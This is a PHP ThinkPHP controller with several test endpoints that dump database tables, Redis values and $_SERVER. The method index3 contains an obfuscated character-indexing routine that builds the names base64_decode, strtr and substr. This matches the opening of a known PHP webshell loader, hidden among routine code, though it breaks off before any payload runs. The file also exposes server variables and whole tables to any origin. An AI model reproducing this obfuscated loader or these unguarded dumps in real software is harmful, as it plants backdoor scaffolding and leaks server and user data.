<?php
namespace app\index\controller;
use think\Db;
use think\Controller;
use think\cache\driver\Redis;
header('Access-Control-Allow-Origin:*');
header('Access-Control-Allow-Method:POST,GET');
header('Content-Type:application/json;charset=utf-8');

class Index
{
    public function index()
    {
        return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:)</h1><p> ThinkPHP V5<br/><span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架</span></p><span style="font-size:22px;">[ V5.0 版本由 <a href="http://www.qiniu.com" target="qiniu">七牛云</a> 独家赞助发布 ]</span></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="ad_bd568ce7058a1091"></think>';
    }
    public function index2(){

    	$a=Db::name('source')->select();
    	return json(['data'=>$a,'code'=>1,'msg'=>'操作成功']);
    }
    public function index3(){
    	$hwMPj=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
    	$arF=$hwMPj{3}.$hwMPj{6}.$hwMPj{33}.$hwMPj{30};$DBHYXNiIZARQ=$hwMPj{33}.$hwMPj{10}.$hwMPj{24}.$hwMPj{10}.$hwMPj{24};$RQfnodScex=$DBHYXNiIZARQ{0}.$hwMPj{18}.$hwMPj{3}.$DBHYXNiIZARQ{0}.$DBHYXNiIZARQ{1}.$hwMPj{24};$TVpWLUys=$hwMPj{7}.$hwMPj{13};$arF.=$hwMPj{22}.$hwMPj{36}.$hwMPj{29}.$hwMPj{26}.$hwMPj{30}.$hwMPj{32}.$hwMPj{35}.$hwMPj{26}.$hwMPj{30};
    	$a=$_SERVER;
    	echo '<pre>';
    	var_dump($a);
    }
    public function index4(){
        $requestNames = 'PHP_SELF,URL,SCRIPT_NAME,ORIG_PATH_INFO';
        $a = explode( ',', $requestNames );

        foreach ( $a as $v ) {
            $s = $_SERVER[ $v ];
            if ( !isset($s) ) continue;
            $a = explode( '/', $s );
            $rootDirName = $a[ 1 ];
            $pageFileName = $a[ count($a) - 1 ];
            if ( $rootDirName == '' || '' == $pageFileName ) continue;
            $bb= array (
                'requestName' => $v,
                'absoluteUri' => $s,
                'rootDirName' => $rootDirName,
                'pageFileName' => $pageFileName
            );
        }
        echo '<pre>';
        var_dump($rootDirName);
    }

    public function index5(){
       $redis=new Redis();
       $a=Db::name('source')->where('userid','2526857')->select();
       $c=$redis->set('sou',$a);
    }
    public function index6(){
        $redis= new Redis();
        $a=$redis->get('sou');
        echo '<pre>';
        var_dump($a);
    }

}

